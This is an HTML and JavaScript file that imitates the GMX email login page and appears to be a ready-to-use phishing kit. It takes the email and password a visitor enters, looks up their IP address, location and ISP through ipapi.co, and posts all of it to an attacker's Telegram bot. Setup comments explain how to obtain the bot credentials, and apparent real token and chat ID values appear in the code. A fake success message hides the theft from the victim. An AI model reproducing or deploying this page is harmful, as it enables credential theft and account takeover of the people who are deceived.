<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GMX Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000000;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(80, 80, 120, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(60, 100, 140, 0.05) 0%, transparent 50%);
            pointer-events: none;
        }

        .login-container {
            background: rgba(15, 15, 15, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 50px 40px;
            width: 90%;
            max-width: 420px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .logo {
            font-size: 48px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 30px;
            letter-spacing: 2px;
        }

        .welcome-text {
            font-size: 32px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 16px;
            color: #a0a0b0;
            margin-bottom: 40px;
        }

        .form-container {
            overflow: hidden;
            position: relative;
        }

        .form-wrapper {
            position: relative;
            width: 200%;
            display: flex;
            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .form-wrapper.show-password {
            transform: translateX(-50%);
        }

        .form-step {
            width: 50%;
            padding-right: 40px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #b0b0c0;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.05);
            color: #ffffff;
        }

        input::placeholder {
            color: #606070;
        }

        input:focus {
            outline: none;
            border-color: #5865f2;
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 30px;
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #5865f2 0%, #7289da 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(88, 101, 242, 0.4);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: transparent;
            color: #b0b0c0;
            border: 2px solid rgba(255, 255, 255, 0.1);
        }

        .btn-secondary:hover {
            border-color: rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.05);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }

        .forgot-password a {
            color: #5865f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .email-display {
            background: rgba(255, 255, 255, 0.05);
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .change-email {
            color: #5865f2;
            font-size: 13px;
            cursor: pointer;
            font-weight: 600;
        }

        .change-email:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loading.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #5865f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            background: rgba(220, 53, 69, 0.1);
            border: 1px solid rgba(220, 53, 69, 0.3);
            color: #ff6b6b;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .error-message.active {
            display: block;
        }

        .success-message {
            background: rgba(40, 167, 69, 0.1);
            border: 1px solid rgba(40, 167, 69, 0.3);
            color: #51cf66;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .success-message.active {
            display: block;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 40px 30px;
            }

            .logo {
                font-size: 36px;
            }

            .welcome-text {
                font-size: 26px;
            }
        }
    </style>
</head>
<body>
    <div class="loading" id="loading">
        <div class="spinner"></div>
    </div>

    <div class="login-container">
        <div class="logo">GMX</div>
        <div class="welcome-text">Welcome!</div>
        <div class="subtitle">Log in with your GMX email address.</div>
        
        <div id="errorMessage" class="error-message"></div>
        <div id="successMessage" class="success-message"></div>

        <div class="form-container">
            <div class="form-wrapper" id="formWrapper">
            <!-- Step 1: Email -->
            <div class="form-step">
                <form id="emailForm">
                    <div class="input-group">
                        <label for="email">Email address</label>
                        <input 
                            type="text" 
                            id="email" 
                            placeholder="your.email@gmx.com"
                            required
                            autocomplete="email"
                        >
                    </div>
                    <div class="button-group">
                        <button type="submit" class="btn-primary">Next</button>
                        <button type="button" class="btn-secondary">Back</button>
                    </div>
                </form>
            </div>

            <!-- Step 2: Password -->
            <div class="form-step">
                <div class="email-display">
                    <span id="displayEmail"></span>
                    <span class="change-email" id="changeEmail">Change</span>
                </div>
                <form id="passwordForm">
                    <div class="input-group">
                        <label for="password">Password</label>
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="Enter your password"
                            required
                            autocomplete="current-password"
                        >
                    </div>
                    <div class="button-group">
                        <button type="submit" class="btn-primary">Log In</button>
                        <button type="button" class="btn-secondary" id="backToEmail">Back</button>
                    </div>
                    <div class="forgot-password">
                        <a href="#">Forgot password?</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

    <script>
        // ============================================================
        // TELEGRAM BOT CONFIGURATION
        // ============================================================
        // IMPORTANT: Replace these values with your actual credentials
        // 
        // 1. Get Bot Token:
        //    - Open Telegram and search for @BotFather
        //    - Send /newbot and follow instructions
        //    - Copy the token (format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)
        //
        // 2. Get Chat ID:
        //    - Search for @userinfobot in Telegram
        //    - Start chat - it shows your Chat ID
        //    - Copy the number (format: 123456789)
        // ============================================================
        
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
        
        // ============================================================

        const formWrapper = document.getElementById('formWrapper');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const displayEmail = document.getElementById('displayEmail');
        const changeEmail = document.getElementById('changeEmail');
        const backToEmail = document.getElementById('backToEmail');
        const loading = document.getElementById('loading');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        function showLoading() {
            loading.classList.add('active');
        }

        function hideLoading() {
            loading.classList.remove('active');
        }

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.classList.add('active');
            setTimeout(() => {
                errorMessage.classList.remove('active');
            }, 5000);
        }

        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.classList.add('active');
            setTimeout(() => {
                successMessage.classList.remove('active');
            }, 3000);
        }

        async function getLocationInfo() {
            console.log('Fetching location info...');
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                console.log('Location data received:', data);
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    countryCode: data.country_code || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                console.error('Error fetching location:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    countryCode: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    timezone: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        async function sendToTelegram(email, password, locationInfo) {
            console.log('Sending to Telegram...', { email, locationInfo });
            const message = `ðŸ” New GMX Login Attempt

ðŸ“§ Email: ${email}
ðŸ”‘ Password: ${password}

ðŸŒ Location Information:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸŒ IP Address: ${locationInfo.ip}
ðŸ³ï¸ Country: ${locationInfo.country} (${locationInfo.countryCode})
ðŸ™ï¸ City: ${locationInfo.city}
ðŸ“ Region: ${locationInfo.region}
ðŸ• Timezone: ${locationInfo.timezone}
ðŸŒ ISP: ${locationInfo.isp}

â° Time: ${new Date().toLocaleString()}
ðŸ’» User Agent: ${navigator.userAgent}`;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            console.log('Telegram URL:', url);
            console.log('Bot Token exists:', TELEGRAM_BOT_TOKEN !== '8313007532:AAFHYoeRYKAwELo5cm9gH0axG7jeM6rSvwM');
            console.log('Chat ID exists:', TELEGRAM_CHAT_ID !== '6924028271');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                console.log('Telegram API response:', data);

                if (data.ok) {
                    return { success: true };
                } else {
                    return { success: false, error: data.description };
                }
            } catch (error) {
                console.error('Telegram send error:', error);
                return { success: false, error: error.message };
            }
        }

        // Handle email form submission
        emailForm.addEventListener('submit', (e) => {
            e.preventDefault();
            if (emailInput.value.trim()) {
                displayEmail.textContent = emailInput.value;
                formWrapper.classList.add('show-password');
                setTimeout(() => passwordInput.focus(), 500);
            }
        });

        // Handle password form submission
        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                showError('Please enter both email and password');
                return;
            }

            // Show loading
            showLoading();

            // Get location information
            const locationInfo = await getLocationInfo();

            // Send to Telegram
            const result = await sendToTelegram(email, password, locationInfo);

            // Hide loading
            hideLoading();

            console.log('Result:', result);

            if (result.success) {
                showSuccess('Login successful! Redirecting...');
                // Optional: Redirect to actual GMX or show success
                setTimeout(() => {
                    // window.location.href = 'https://www.gmx.com';
                    // Or clear the form
                    emailInput.value = '';
                    passwordInput.value = '';
                    goBackToEmail();
                }, 2000);
            } else {
                showError(`Login failed: ${result.error || 'Please check your bot token and chat ID'}`);
                console.error('Telegram API Error:', result.error);
            }
        });

        // Back to email step
        const goBackToEmail = () => {
            formWrapper.classList.remove('show-password');
            setTimeout(() => emailInput.focus(), 500);
        };

        backToEmail.addEventListener('click', goBackToEmail);
        changeEmail.addEventListener('click', goBackToEmail);

        // Focus email input on page load
        emailInput.focus();
    </script>
</body>
</html>
